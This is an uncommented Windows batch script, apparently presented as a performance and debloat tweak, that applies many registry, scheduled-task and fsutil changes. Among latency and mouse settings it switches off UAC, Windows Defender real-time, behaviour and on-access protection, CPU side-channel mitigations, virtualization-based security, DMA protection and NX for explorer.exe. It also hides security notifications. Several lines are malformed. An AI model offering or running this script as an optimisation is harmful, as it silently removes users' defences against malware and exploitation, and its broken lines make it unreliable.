reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "MitigationOptions" /t REG_BINARY /d "222222222222222222222222222222222222222222222222" /f 
cls
fsutil behavior set memoryusage 2
fsutil behavior set mftzone 4 
fsutil behavior set disablelastaccess 1 
fsutil behavior set disabledeletenotify 0 
fsutil behavior set encryptpagingfile 0 
cls
PowerShell -Command "Disable-MMAgent -MemoryCompression"
cls
PowerShell -Command "Disable-MMAgent -PageCombining" 
cls
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator"
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator" /disable 
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\BthSQM"  
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\BthSQM" /disable  
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask"  
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask" /disable  
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\UsbCeip"  
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\UsbCeip" /disable  
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\Uploader"  
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\Uploader" /disable  
schtasks /end /tn "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser"  
schtasks /change /tn "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" /disable  
schtasks /end /tn "\Microsoft\Windows\Application Experience\ProgramDataUpdater"  
schtasks /change /tn "\Microsoft\Windows\Application Experience\ProgramDataUpdater" /disable  
schtasks /end /tn "\Microsoft\Windows\Application Experience\StartupAppTask"  
schtasks /change /tn "\Microsoft\Windows\Application Experience\StartupAppTask" /disable  
schtasks /end /tn "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector"  
schtasks /change /tn "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector" /disable  
schtasks /end /tn "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticResolver"  
schtasks /change /tn "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticResolver" /disable  
schtasks /end /tn "\Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem"  
schtasks /change /tn "\Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem" /disable  
schtasks /end /tn "\Microsoft\Windows\Shell\FamilySafetyMonitor"  
schtasks /change /tn "\Microsoft\Windows\Shell\FamilySafetyMonitor" /disable  
schtasks /end /tn "\Microsoft\Windows\Shell\FamilySafetyRefresh"  
schtasks /change /tn "\Microsoft\Windows\Shell\FamilySafetyRefresh" /disable  
schtasks /end /tn "\Microsoft\Windows\Shell\FamilySafetyUpload"  
schtasks /change /tn "\Microsoft\Windows\Shell\FamilySafetyUpload" /disable  
schtasks /end /tn "\Microsoft\Windows\Autochk\Proxy"  
schtasks /change /tn "\Microsoft\Windows\Autochk\Proxy" /disable  
schtasks /end /tn "\Microsoft\Windows\Maintenance\WinSAT"  
schtasks /change /tn "\Microsoft\Windows\Maintenance\WinSAT" /disable  
schtasks /end /tn "\Microsoft\Windows\Application Experience\AitAgent"  
schtasks /change /tn "\Microsoft\Windows\Application Experience\AitAgent" /disable  
schtasks /end /tn "\Microsoft\Windows\Windows Error Reporting\QueueReporting"  
schtasks /change /tn "\Microsoft\Windows\Windows Error Reporting\QueueReporting" /disable  
schtasks /end /tn "\Microsoft\Windows\CloudExperienceHost\CreateObjectTask"  
schtasks /change /tn "\Microsoft\Windows\CloudExperienceHost\CreateObjectTask" /disable  
schtasks /end /tn "\Microsoft\Windows\DiskFootprint\Diagnostics"  
schtasks /change /tn "\Microsoft\Windows\DiskFootprint\Diagnostics" /disable  
schtasks /end /tn "\Microsoft\Windows\FileHistory\File History (maintenance mode)"  
schtasks /change /tn "\Microsoft\Windows\FileHistory\File History (maintenance mode)" /disable  
schtasks /end /tn "\Microsoft\Windows\PI\Sqm-Tasks"  
schtasks /change /tn "\Microsoft\Windows\PI\Sqm-Tasks" /disable  
schtasks /end /tn "\Microsoft\Windows\NetTrace\GatherNetworkInfo"  
schtasks /change /tn "\Microsoft\Windows\NetTrace\GatherNetworkInfo" /disable  
schtasks /end /tn "\Microsoft\Windows\AppID\SmartScreenSpecific"  
schtasks /change /tn "\Microsoft\Windows\AppID\SmartScreenSpecific" /disable  
schtasks /end /tn "\Microsoft\Office\OfficeTelemetryAgentFallBack2016"  
schtasks /change /tn "\Microsoft\Office\OfficeTelemetryAgentFallBack2016" /disable  
schtasks /end /tn "\Microsoft\Office\OfficeTelemetryAgentLogOn2016"  
schtasks /change /tn "\Microsoft\Office\OfficeTelemetryAgentLogOn2016" /disable  
schtasks /end /tn "\Microsoft\Office\OfficeTelemetryAgentLogOn"  
schtasks /change /TN "\Microsoft\Office\OfficeTelemetryAgentLogOn" /disable  
schtasks /end /tn "\Microsoftd\Office\OfficeTelemetryAgentFallBack"  
schtasks /change /TN "\Microsoftd\Office\OfficeTelemetryAgentFallBack" /disable  
schtasks /end /tn "\Microsoft\Office\Office 15 Subscription Heartbeat"  
schtasks /change /TN "\Microsoft\Office\Office 15 Subscription Heartbeat" /disable  
schtasks /end /tn "\Microsoft\Windows\Time Synchronization\ForceSynchronizeTime"  
schtasks /change /TN "\Microsoft\Windows\Time Synchronization\ForceSynchronizeTime" /disable  
schtasks /end /tn "\Microsoft\Windows\Time Synchronization\SynchronizeTime"  
schtasks /change /TN "\Microsoft\Windows\Time Synchronization\SynchronizeTime" /disable  
schtasks /end /tn "\Microsoft\Windows\WindowsUpdate\Automatic App Update"  
schtasks /change /TN "\Microsoft\Windows\WindowsUpdate\Automatic App Update" /disable  
schtasks /end /tn "\Microsoft\Windows\Device Information\Device"  
schtasks /change /TN "\Microsoft\Windows\Device Information\Device" /disable  
cls
reg add "HKLM\System\CurrentControlSet\Services\Appinfo" /v "Start" /t REG_DWORD /d "4" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableVirtualization" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableInstallerDetection" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableSecureUIAPaths" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ValidateAdminCodeSignatures" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableUIADesktopToggle" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "FilterAdministratorToken" /t REG_DWORD /d "0" /f >NUL 2>&1
cls
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\WindowsUpdate\UpdatePolicy\PolicyState" /v "BranchReadinessLevel" /t REG_SZ /d "CB" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\WindowsUpdate\UpdatePolicy\PolicyState" /v "DeferFeatureUpdates" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\WindowsUpdate\UpdatePolicy\PolicyState" /v "DeferQualityUpdates" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\WindowsUpdate\UpdatePolicy\PolicyState" /v "ExcludeWUDrivers" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\WindowsUpdate\UpdatePolicy\PolicyState" /v "FeatureUpdatesDeferralInDays" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\WindowsUpdate\UpdatePolicy\PolicyState" /v "IsDeferralIsActive" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\WindowsUpdate\UpdatePolicy\PolicyState" /v "IsWUfBConfigured" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\WindowsUpdate\UpdatePolicy\PolicyState" /v "IsWUfBDualScanActive" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\WindowsUpdate\UpdatePolicy\PolicyState" /v "PolicySources" /t REG_DWORD /d "2" /f >NUL 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate" /v "BranchReadinessLevel" /t REG_DWORD /d "16" /f >NUL 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate" /v "DeferFeatureUpdates" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate" /v "DeferFeatureUpdatesPeriodInDays" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate" /v "ExcludeWUDriversInQualityUpdate" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate" /v "ManagePreviewBuilds" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate" /v "ManagePreviewBuildsPolicyValue" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate" /v "PauseFeatureUpdatesStartTime" /t REG_SZ /d "" /f >NUL 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "DetectionFrequency" /t REG_DWORD /d "20" /f >NUL 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "DetectionFrequencyEnabled" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "EnableFeaturedSoftware" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\PolicyManager\current\device\Update" /v "ExcludeWUDriversInQualityUpdate" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\PolicyManager\default\Update" /v "ExcludeWUDriversInQualityUpdate" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\PolicyManager\default\Update\ExcludeWUDriversInQualityUpdate" /v "value" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\WindowsUpdate\UX\Settings" /v "ExcludeWUDriversInQualityUpdate" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\DriverSearching" /v "SearchOrderConfig" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\Software\WOW6432Node\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\Software\WOW6432Node\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\Software\WOW6432Node\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d "0" /f >NUL 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "GlobalTimerResolutionRequests" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters" /v "KeyboardDataQueueSize" /t REG_DWORD /d "28" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "30" /f
reg add "HKCU\Control Panel\Mouse" /v "MouseThreshold1" /t REG_SZ /d "0" /f >nul
reg add "HKCU\Control Panel\Mouse" /v "MouseThreshold2" /t REG_SZ /d "0" /f >nul
reg add "HKCU\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "0" /f >nul
reg add "HKCU\Control Panel\Keyboard" /v "KeyboardDelay" /t REG_SZ /d "0" /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "SleepStudyDisabled" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender-Operational" /v Enable-OperationalChannel /t REG_DWORD /d 0 /f >NUL 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting" /v Disabled /t REG_DWORD /d 1 /f >NUL 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v AllowTelemetry /t REG_DWORD /d 0 /f >NUL 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v DisableCEIP /t REG_DWORD /d 1 /f >NUL 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\MinAppSession" /v fDenyTSApplications /t REG_DWORD /d 0 /f >NUL 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\AppLocker" /v DisableNewDMADevicesWhenLocked /t REG_DWORD /d 1 /f >NUL 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\hh.exe" /v DisableNX /t REG_DWORD /d 1 /f >NUL 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" /v DisableNX /t REG_DWORD /d 1 /f >NUL 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Defender\SystemGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1 /f >NUL 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings" /v HideAllNotifications /t REG_DWORD /d 1 /f >NUL 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Taskband" /v HideSecurityCenter /t REG_DWORD /d 1 /f >NUL 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel\MitigationAuditOptions" /v AuditSystemPolicy /t REG_DWORD /d 22222222 /f >NUL 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel\MitigationOptions" /v AuditSystemPolicy /t REG_DWORD /d 22222222 /f >NUL 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v MoveImages /t REG_DWORD /d 0x00000000 /f >NUL 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettings /t REG_DWORD /d 0x1 /f >NUL 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverride /t REG_DWORD /d 0x3 /f >NUL 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverrideMask /t REG_DWORD /d 0x3 /f >NUL 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v IOMMUFlags /t REG_DWORD /d 0x0 /f >NUL 2>&1
reg add "HKCU\Control Panel\Accessibility\Keyboard Response" /v Flags /t REG_DWORD /d 0x0 /f >NUL 2>&1
reg add "HKCU\Control Panel\Accessibility\Mouse Keys" /v Flags /t REG_DWORD /d 0x0 /f >NUL 2>&1
reg add "HKCU\Control Panel\Accessibility\StickyKeys" /v Flags /t REG_DWORD /d 0x0 /f >NUL 2>&1
reg add "HKCU\Control Panel\Accessibility\SoundSentry" /v Flags /t REG_DWORD /d 0x0 /f >NUL 2>&1
reg add "HKCU\Control Panel\Desktop" /v MenuShowDelay /t REG_DWORD /d 0 /f >NUL 2>&1
reg add "HKCU\Control Panel\Accessibility\ToggleKeys" /v Flags /t REG_DWORD /d 0x0 /f >NUL 2>&1
cls
for /f "tokens=*" %%i in ('reg query "HKLM\SYSTEM\CurrentControlSet\Enum\SCSI"^| findstr "HKEY"') do (
		for /f "tokens=*" %%a in ('reg query "%%i"^| findstr "HKEY"') do reg.exe add "%%a\Device Parameters\Disk" /v "CacheIsPowerProtected" /t REG_DWORD /d "1" /f > NUL 2>&1
	)
	for /f "tokens=*" %%i in ('reg query "HKLM\SYSTEM\CurrentControlSet\Enum\SCSI"^| findstr "HKEY"') do (
		for /f "tokens=*" %%a in ('reg query "%%i"^| findstr "HKEY"') do reg.exe add "%%a\Device Parameters\Disk" /v "UserWriteCacheSetting" /t REG_DWORD /d "1" /f > NUL 2>&1
	)
)

for %%a in (NetbiosOptions) do for /f "delims=" %%b in ('reg query "HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces" /s /f "%%a" ^| findstr "HKEY"') do reg.exe add "%%b" /v "%%a" /t REG_DWORD /d "2" /f > NUL 2>&1

for %%a in (
	EnhancedPowerManagementEnabled
	AllowIdleIrpInD3
	EnableSelectiveSuspend
	DeviceSelectiveSuspended
	SelectiveSuspendEnabled
	SelectiveSuspendOn
	EnumerationRetryCount
	ExtPropDescSemaphore
	WaitWakeEnabled
	D3ColdSupported
	WdfDirectedPowerTransitionEnable
	EnableIdlePowerManagement
	IdleInWorkingState
) do for /f "delims=" %%b in ('reg query "HKLM\SYSTEM\CurrentControlSet\Enum" /s /f "%%a" ^| findstr "HKEY"') do reg.exe add "%%b" /v "%%a" /t REG_DWORD /d "0" /f > NUL 2>&1

reg add "HKLM\Software\Policies\Microsoft\FVE" /v "DisableExternalDMAUnderLock" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\DeviceGuard" /v "HVCIMATRequired" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\System\CurrentControlSet\Control\GraphicsDrivers" /v "DpiMapIommuContiguous" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\System\CurrentControlSet\Control\Session Manager" /v "AlpcWakePolicy" /t REG_DWORD /d "1" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "10" /f >NUL 2>&1
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "10" /f >NUL 2>&1
reg add "HKLM\System\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "40" /f >NUL 2>&1
reg add "HKLM\System\CurrentControlSet\Control\Session Manager\Power" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\System\CurrentControlSet\Control\Session Manager\kernel" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\System\CurrentControlSet\Control\Session Manager\Executive" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\System\CurrentControlSet\Control\Session Manager" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\System\CurrentControlSet\Control\Power\ModernSleep" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\System\CurrentControlSet\Control\Power" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >NUL 2>&1
reg add "HKLM\System\CurrentControlSet\Control" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >NUL 2>&1
cls
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\QoS" /v "Tcp Autotuning Level" /t REG_SZ /d "Off" /f  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\QoS" /v "Tcp Autotuning Level" /t REG_SZ /d "Highly Restricted" /f  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\QoS" /v "Tcp Autotuning Level" /t REG_SZ /d "Restricted" /f  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\QoS" /v "Tcp Autotuning Level" /t REG_SZ /d "Normal" /f  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\QoS" /v "Application DSCP Marking Request" /t REG_SZ /d "Ignored" /f  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\QoS" /v "Application DSCP Marking Request" /t REG_SZ /d "Allowed" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\QoS" /v "Do not use NLA" /t REG_SZ /d "1" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableUserTOSSetting" /t REG_DWORD /d "0" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\NlaSvc\Parameters\Internet" /v "CorpLocationProbeTimeout" /t REG_DWORD /d "30" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\NlaSvc\Parameters\Internet" /v "LdapTimeoutMs" /t REG_DWORD /d "5000" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\NlaSvc\Parameters\Internet" /v "ShowDomainEndpointInterfaces" /t REG_DWORD /d "1" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\NlaSvc\Parameters\Internet" /v "EnableNoGatewayLocationDetection" /t REG_DWORD /d "1" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\NlaSvc\Parameters\Internet" /v "MinimumInternetHopCount" /t REG_DWORD /d "2" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm\NVAPI" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm\Global\NVTweak" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f   
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability" /v "TimeStampInterval" /t REG_DWORD /d "0" /f  
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Diagnostics\Performance" /F /V "DisableDiagnosticTracing" /T REG_DWORD /d 1  
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power" /F /V "EventProcessorEnabled" /T REG_DWORD /d 0  
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /F /V "MonitorLatencyTolerance" /T REG_DWORD /d 0  
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /F /V "MonitorRefreshLatencyTolerance" /T REG_DWORD /d 0  
REG ADD "HKEY_CURRENT_USER\Control Panel\Desktop" /F /V "MenuShowDelay" /T REG_SZ /d 0  
REG ADD "HKEY_CURRENT_USER\Control Panel\Mouse" /F /V "MouseSensitivity" /T REG_SZ /d 0  
REG ADD "HKEY_CURRENT_USER\Control Panel\Mouse" /F /V "SmoothMouseXCurve" /T REG_BINARY /d 0000000000000000C0CC0C0000000000809919000000000040662600000000000033330000000000  
REG ADD "HKEY_CURRENT_USER\Control Panel\Mouse" /F /V "SmoothMouseYCurve" /T REG_BINARY /d 0000000000000000000038000000000000007000000000000000A800000000000000E00000000000  
REG ADD "HKEY_CURRENT_USER\Control Panel\Mouse" /F /V "MouseSpeed" /T REG_SZ /d 0  
REG ADD "HKEY_CURRENT_USER\Control Panel\Mouse" /F /V "MouseThreshold1" /T REG_SZ /d 0  
REG ADD "HKEY_CURRENT_USER\Control Panel\Mouse" /F /V "MouseThreshold2" /T REG_SZ /d 0  
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "ConvertibleSlateMode" /t REG_DWORD /d "0" /f  
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "40" /f  
REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\Update" /v "ExcludeWUDriversInQualityUpdate" /t REG_DWORD /d "1" /f  
REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Update" /v "ExcludeWUDriversInQualityUpdate" /t REG_DWORD /d "1" /f  
REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Update\ExcludeWUDriversInQualityUpdate" /v "value" /t REG_DWORD /d "1" /f  
REG ADD "HKLM\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" /v "ExcludeWUDriversInQualityUpdate" /t REG_DWORD /d "1" /f  
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "ExcludeWUDriversInQualityUpdate" /t REG_DWORD /d "1" /f  
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v "VisualFXSetting" /t REG_DWORD /d "3" /f   
reg add "HKCU\Control Panel\Desktop" /v "DragFullWindows" /t REG_SZ /d "0" /f reg add "HKCU\Control Panel\Desktop" /v "FontSmoothing" /t REG_SZ /d "2" /f   
reg add "HKCU\Control Panel\Desktop" /v "UserPreferencesMask" /t REG_BINARY /d "9012038010020000" /f   
reg add "HKCU\Control Panel\Desktop\WindowMetrics" /v "MinAnimate" /t REG_SZ /d "0" /f   
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "ShellState" /t REG_BINARY /d "240000003E28000000000000000000000000000001000000130000000000000072000000" /f   
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "IconsOnly" /t REG_DWORD /d "1" /f   
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ListviewAlphaSelect" /t REG_DWORD /d "0" /f   
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ListviewShadow" /t REG_DWORD /d "0" /f   
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarAnimations" /t REG_DWORD /d "0" /f  
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsConsumerFeatures" /t REG_DWORD /d "1" /f  
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF" /v "LogEnable" /t REG_DWORD /d "0" /f reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF" /v "LogLevel" /t REG_DWORD /d "0" /f  
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338389Enabled" /t REG_DWORD /d "0" /f  
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Privacy" /v "TailoredExperiencesWithDiagnosticDataEnabled" /t REG_DWORD /d "0" /f  
